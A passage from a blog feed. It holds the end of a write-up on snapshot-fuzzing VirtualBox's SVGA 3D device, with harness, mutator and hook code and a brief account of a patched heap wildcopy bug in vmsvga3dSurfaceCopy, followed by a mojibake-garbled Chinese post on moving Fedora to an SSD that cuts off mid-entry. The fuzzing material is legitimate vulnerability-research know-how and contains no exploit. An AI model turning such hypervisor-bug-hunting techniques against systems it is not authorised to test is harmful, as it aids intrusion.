class="hljs-string">&quot;testcase deque empty! goto next round...\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> Backend-&gt;<span class="hljs-built_in">Stop</span>(<span class="hljs-built_in">Ok_t</span>());<br>  &#125;<br><br>  <span class="hljs-keyword">auto</span> &amp;Testcase = GlobalState.SvgaCmds.<span class="hljs-built_in">front</span>();<br><br>  <span class="hljs-keyword">while</span> (Testcase.SvgaCmdCode == <span class="hljs-number">1045</span>) &#123;<br>    GlobalState.SvgaCmds.<span class="hljs-built_in">pop_front</span>();<br><br>    <span class="hljs-keyword">if</span>(GlobalState.SvgaCmds.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;testcase deque empty during cmd filtering! goto next round...\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> Backend-&gt;<span class="hljs-built_in">Stop</span>(<span class="hljs-built_in">Ok_t</span>());<br>    &#125;<br><br>    Testcase = GlobalState.SvgaCmds.<span class="hljs-built_in">front</span>();<br>  &#125;<br><br>  Backend-&gt;<span class="hljs-built_in">Rbx</span>(Testcase.SvgaCmdCode);<br><br>  <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;SvgaCmdCode = &#123;:#x&#125;\n&quot;</span>, Testcase.SvgaCmdCode);<br><br>  <span class="hljs-keyword">if</span>(Testcase.SvgaCmdCode &gt;= <span class="hljs-number">1040</span>) &#123;<br>    <br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;Have to avoid AssertBreak(pHdr-&gt;size &lt; pThis-&gt;svga.cbFIFO), write &#123;:#x&#125; on first DWORD\n&quot;</span>, Testcase.SvgaBody.<span class="hljs-built_in">size</span>());<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> Svga3dCmdSize = Testcase.SvgaBody.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">if</span>(Svga3dCmdSize &gt;= <span class="hljs-number">0x200000</span>) &#123;<br>      fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Svga3dCmdSize(&#123;:#x&#125;) &gt; cbFIFO, abort\n&quot;</span>, Svga3dCmdSize);<br>      std::<span class="hljs-built_in">abort</span>();<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="hljs-number">0</span>], &amp;Svga3dCmdSize, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="hljs-number">4</span>], Testcase.SvgaBody.<span class="hljs-built_in">data</span>(), Testcase.SvgaBody.<span class="hljs-built_in">size</span>());<br>    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="hljs-built_in">size</span>() + <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">memcpy</span>(GlobalState.SvgaCmdBody, Testcase.SvgaBody.<span class="hljs-built_in">data</span>(), Testcase.SvgaBody.<span class="hljs-built_in">size</span>());<br>    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="hljs-built_in">size</span>();<br>  &#125;    <br><br>  GlobalState.SvgaCmds.<span class="hljs-built_in">pop_front</span>();<br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on SvgaLoopStart\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>After some investigation, I found <code>CreateDeviceEx</code> call in <code>vmsvga3dContextDefine</code> keep causing <strong>CR3 context switching</strong> and I didnâ€™t found any way to handling it using breakpoint handler. So I just blacklisting it( <code>SVGA_3D_CMD_CONTEXT_DEFINE</code> &#x3D; <code>1045</code> ).</p><p>I disclose almost every part of fuzz module except mutation part. I just use libfuzzer mutator to mutate body data of SVGA command and pick one of command in array randomly.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">CustomMutator_t</span><span class="hljs-params">(std::mt19937_64 &amp;Rng, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> TestcaseMaxSize)</span></span><br><span class="hljs-function">  : Rng_(Rng), TestcaseMaxSize_(TestcaseMaxSize) &#123;</span><br><br>    <span class="hljs-comment">// set maximum size for multiple (mutated) testcase( Default = 1MB )</span><br>    ScratchBuffer__ = std::<span class="hljs-built_in">make_unique</span>&lt;<span class="hljs-type">uint8_t</span>[]&gt;(_1MB);<br>    ScratchBuffer_  = &#123;ScratchBuffer__.<span class="hljs-built_in">get</span>(), _1MB&#125;;<br><br>    BodyMutator_ = <span class="hljs-built_in">make_unique</span>&lt;LibfuzzerMutator_t&gt;(Rng, TestcaseMaxSize);<br>&#125;<br><br><span class="hljs-comment">// skip for brevity...</span><br><br><span class="hljs-function">std::string <span class="hljs-title">Mutate</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> DataLen, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> MaxSize)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> Root = <span class="hljs-built_in">Deserialize</span>(Data, DataLen);<br>  <span class="hljs-keyword">auto</span> &amp;SvgaCmds = Root.SvgaCmds;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;SvgaCmd : SvgaCmds) &#123;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 50%</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>) &#123;  <br>      <span class="hljs-type">uint32_t</span> SvgaCmdRandomIdx = <span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, SvgaCmdListLen);<br>      SvgaCmd.SvgaCmdCode = SvgaCmdList[SvgaCmdRandomIdx];<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="hljs-built_in">data</span>(), SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>());<br>    <span class="hljs-type">size_t</span> NewTestcaseSize = BodyMutator_-&gt;Mut_.<span class="hljs-built_in">Mutate</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>(), MaxSize);<br>    SvgaCmd.SvgaBody.<span class="hljs-built_in">resize</span>(NewTestcaseSize);<br>    <span class="hljs-built_in">memcpy</span>(SvgaCmd.SvgaBody.<span class="hljs-built_in">data</span>(), GlobalMutBuffer, NewTestcaseSize);<br>  &#125;<br>  <br>  json::json Serialized;<br>  <span class="hljs-built_in">to_json</span>(Serialized, Root);<br>  <span class="hljs-keyword">return</span> Serialized.<span class="hljs-built_in">dump</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>I also define generator function. It is very useful if you are too lazy to create random input like me ^~^.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">std::string <span class="hljs-title">GenerateTestcase</span><span class="hljs-params">()</span> </span>&#123;<br>  SvgaCmds_t Root;<br>  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> N = <span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> Idx = <span class="hljs-number">0</span>; Idx &lt; N; Idx++) &#123;<br>    SvgaCmd_t SvgaCmd;<br>    <br>    SvgaCmd.SvgaCmdCode = SvgaCmdList[<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, SvgaCmdListLen)];<br>    SvgaCmd.SvgaBody.<span class="hljs-built_in">resize</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0x100</span>, <span class="hljs-number">0x400</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        SvgaCmd.SvgaBody[i] = <span class="hljs-number">0x41</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        SvgaCmd.SvgaBody[i] = (<span class="hljs-type">uint8_t</span>)<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);<br>      &#125;<br>    &#125;<br><br>    Root.SvgaCmds.<span class="hljs-built_in">emplace_back</span>(SvgaCmd);<br>  &#125;<br><br>  json::json Serialized;<br>  <span class="hljs-built_in">to_json</span>(Serialized, Root);<br>  <span class="hljs-keyword">return</span> Serialized.<span class="hljs-built_in">dump</span>();<br>&#125;<br><br><span class="hljs-function">std::string <span class="hljs-title">GetNewTestcase</span><span class="hljs-params">(<span class="hljs-type">const</span> Corpus_t &amp;Corpus)</span> <span class="hljs-keyword">override</span> </span>&#123;<br><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// 20%</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">GenerateTestcase</span>();<br>  &#125;<br><br>  <span class="hljs-type">const</span> Testcase_t *Testcase = Corpus.<span class="hljs-built_in">PickTestcase</span>();<br><br>  <span class="hljs-keyword">if</span> (!Testcase) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The corpus is empty, generate random one\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">GenerateTestcase</span>();<br>  &#125;<br><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Copy the input in a buffer we&#x27;re going to mutate.</span><br>  <span class="hljs-comment">//</span><br><br>  <span class="hljs-built_in">memcpy</span>(ScratchBuffer_.<span class="hljs-built_in">data</span>(), Testcase-&gt;Buffer_.<span class="hljs-built_in">get</span>(),<br>         Testcase-&gt;BufferSize_);<br><br>  <span class="hljs-comment">// return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, TestcaseMaxSize_);</span><br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Mutate</span>(ScratchBuffer_.<span class="hljs-built_in">data</span>(), Testcase-&gt;BufferSize_, u32PbBounceBufMaxSize - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint32_t</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>Aaaaannnd, this is everything you need to fuzz! I skip some formal code for brevity, but I think you can easily find what you need to define fully working fuzz module.</p><p>â€¦..Ooooh wait, I forgot something. After some hours of struggle, I define a blacklist which cause CR3 context switching. I just put it on the end of <code>Init()</code> function.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SetupVBoxBlacklistHooks</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxRT!RTLogLoggerEx&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxRT!RTLogLoggerEx\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxVMM!PDMCritSectLeave&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxVMM!PDMCritSectLeave\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxC!util::AutoLockBase::release&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::release\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxC!util::AutoLockBase::acquire&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::acquire\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VirtualBoxVM!UIFrameBufferPrivate::NotifyChange&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VirtualBoxVM!UIFrameBufferPrivate::NotifyChange\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxRT!SUPSemEventWaitNoResume&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxRT!SUPSemEventWaitNoResume\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CBaseDevice::Release&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CBaseDevice::Release\n&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CD3DBase::Clear&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CD3DBase::Clear\n&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CMipMap::SetAutoGenFilterType&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::SetAutoGenFilterType\n&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CMipMap::GenerateMipSubLevels&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::GenerateMipSubLevels\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;USER32!GetDC&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0x1337</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on USER32!GetDC\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Yep. Thatâ€™s really everything. I use this fuzz module several hours and it founds interesting crash.</p><h1 id="3-Vulnerability-TL-DR"><a href="#3-Vulnerability-TL-DR" class="headerlink" title="3. Vulnerability( TL;DR )"></a>3. Vulnerability( TL;DR )</h1><p>Crash occurred in <code>vmsvga3dSurfaceCopy</code> function( <strong>PageHeap</strong> needed ).</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah2.png" alt="blahblah2"></p><p>This function trying to copy surface data from one to another using surface id and thereâ€™s no boundary check between surface, so it become exploitable wildcopy vulnerability in heap memory.</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah3.png" alt="spot the bug"></p><p>This vulnerability patched in <a href="https://www.oracle.com/security-alerts/cpujul2022.html">6.1.36 release</a> at July, 2022.</p><h1 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h1><p>I think importance of snapshot fuzzing is, it makes researcher to focus on target itself. </p><p>Unlike other fuzzers based on runtime and DBI are often create (very) unreasonable side effect or need lots of time to create working harness. The concept of snapshot fuzzing makes it possible to reduce this waste of time.</p>]]></content>
    
    
    
    <tags>
      
      <tag>Archives</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSD è¿ç§»è®°</title>
    <link href="/cn/ssd/"/>
    <url>/cn/ssd/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºæŸäº›éœ€æ±‚ï¼Œå†³å®šä¸ŠSSDï¼Œæé«˜ä¸€ä¸‹ç¡¬ç›˜è¯»å†™é€Ÿåº¦ã€‚ä¸ŠäºŒæ‰‹ä¸œä¹°äº†ä¸‰æ˜Ÿ(SAMSUNG) 860 EVO æœ€åˆçš„æƒ³æ³•æ˜¯ä½œä¸ºæ•°æ®ç›˜ä½¿ç”¨ï¼Œå³æ“ä½œç³»ç»Ÿè¿˜æ˜¯è·‘åœ¨æœºæ¢°ç¡¬ç›˜ä¸Šï¼Œä»”ç»†ä¸€æ€è€ƒï¼Œè¿˜æ˜¯æŠ˜è…¾ä¸€ä¸‹ï¼Œè¦ä¸å®åœ¨æ˜¯æœ‰äº›æµªè´¹ï¼Œäº‹å®è¯æ˜ï¼ŒæŠ˜è…¾æ˜¯å€¼å¾—çš„ï¼Œæ„Ÿè§‰å°±åƒé£ä¸€æ ·ã€‚</p><p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹ç£ç›˜åŸå§‹çš„æƒ…å†µï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mount<br><br>/dev/sda1 on /boot <span class="hljs-built_in">type</span> ext4 (rw,relatime,seclabel,stripe=4)<br>/dev/mapper/fedora-root on / <span class="hljs-built_in">type</span> ext4 (rw,relatime,seclabel)<br></code></pre></td></tr></table></figure><p>å½“ç„¶é¦–å…ˆè¦æŠŠ SSD å¤„ç†ä¸€ä¸‹ï¼Œå®‰è£…ä¸€ä¸‹ <code>gparted</code> å›¾å½¢åŒ–ç•Œé¢å¾ˆå¥½ç”¨ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo dnf install gparted<br></code></pre></td></tr></table></figure><p>å»ºä¸ªåˆ†åŒºè¡¨ï¼Œé€‰æ‹© gptï¼Œåˆ†ä¸ªåŒºï¼Œ<code>/dev/mapper/fedora-root</code> å¤§å°ä¸º50Gï¼Œå…ˆåˆ†ä¸ª50Gçš„åˆ†åŒºï¼Œå‰©ä¸‹çš„å…¨éƒ¨ç»™ å¦å¤–ä¸€ä¸ªåˆ†åŒºï¼Œæ ¼å¼åŒ–ä¸º ext4ã€‚æ“ä½œå®Œæˆåï¼Œç”¨fdisk æŸ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ fdisk -l<br><br>Disk /dev/sdbï¼š232.9 GiBï¼Œ250059350016 å­—èŠ‚ï¼Œ488397168 ä¸ªæ‰‡åŒº<br>å•å…ƒï¼šæ‰‡åŒº / 1 * 512 = 512 å­—èŠ‚<br>æ‰‡åŒºå¤§å°(é€»è¾‘/ç‰©ç†)ï¼š512 å­—èŠ‚ / 512 å­—èŠ‚<br>I/O å¤§å°(æœ€å°/æœ€ä½³)ï¼š512 å­—èŠ‚ / 512 å­—èŠ‚<br>ç£ç›˜æ ‡ç­¾ç±»å‹ï¼šgpt<br>ç£ç›˜æ ‡è¯†ç¬¦ï¼š<br><br>è®¾å¤‡            èµ·ç‚¹      æœ«å°¾      æ‰‡åŒº   å¤§å° ç±»å‹<br>/dev/sdb1       2048 104859647 104857600    50G Linux æ–‡ä»¶ç³»ç»Ÿ<br>/dev/sdb2  104859648 488396799 383537152 182.9G Linux æ–‡ä»¶ç³»ç»Ÿ<br></code></pre></td></tr></table></figure><p>å°†åŸæ¥ç³»ç»Ÿçš„ &#x2F; dd åˆ°æ–°çš„SSD çš„ <code>/dev/sdb1</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mapper/fedora-root of=/dev/sdb1 bs=1M<br></code></pre></td></tr></table></figure><p>ç”¨æ–°çš„ root æŠŠç³»ç»Ÿå¯åŠ¨èµ·æ¥ï¼Œreboot åè¿›å…¥å¼•å¯¼ç•Œé¢ï¼ŒæŒ‰e ç¼–è¯‘ï¼Œæ‰¾åˆ° root&#x3D;&#x2F;dev&#x2F;fedora&#x2F;root æ”¹ä¸º root&#x3D;&#x2F;dev&#x2F;sdb1 æŒ‰ ctrl+x å¯åŠ¨ï¼Œä¸€ä¼šå„¿å°±è¿›ç³»ç»Ÿäº†ï¼Œé€Ÿåº¦æå‡å¾ˆå¤§ã€‚ç°åœ¨éœ€è¦æŠŠ grub.cfg æ›´æ–°ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ‰‹åŠ¨ä¿®æ”¹è¿›å…¥äº†æ–°çš„æ ¹ï¼Œå¦‚æœé‡å¯çš„è¯ï¼Œè¿˜æ˜¯ä¼šä½¿ç”¨è€çš„æ ¹ï¼Œå› ä¸ºgrub.cfg é‡Œå°±æ˜¯è¿™ä¹ˆå†™çš„ã€‚</p><p>è¦ç”Ÿæˆæ–°çš„grub.cfg éœ€è¦ä½¿ç”¨grub2-mkconfig, å‘½ä»¤å¾ˆç®€å•</p><p><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>æ‰§è¡Œå‘½ä»¤åé‡å¯ï¼Œmd æ€ä¹ˆåˆè¿›åˆ°è€æ ¹å»äº†ã€‚</p><p>è¿™é‡ŒæŠ˜è…¾äº†å¥½ä¹…ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜Fedora çš„å†…æ ¸å‡ºbug äº†ï¼Œæ¯æ¬¡é‡å¯éƒ½è¦ç­‰å¾…éå¸¸ä¹…çš„æ—¶é—´ï¼Œæ‰€ä»¥æ­£ç¡®çš„é¡ºåºåº”è¯¥æ˜¯å…ˆå‡çº§ç³»ç»Ÿå† dd ã€‚è§£å†³äº†Fedora å†…æ ¸çš„é—®é¢˜åï¼Œå‘ç°è¿˜æ˜¯è¿›ä¸åˆ°æ–°æ ¹ã€‚è®¤çœŸåœ°æŸ¥çœ‹ grub.cfg å†…å®¹, grub2 æ”¹åŠ¨æŒºå¤§ï¼Œä¸å¤ªç†Ÿæ‚‰äº†ã€‚</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 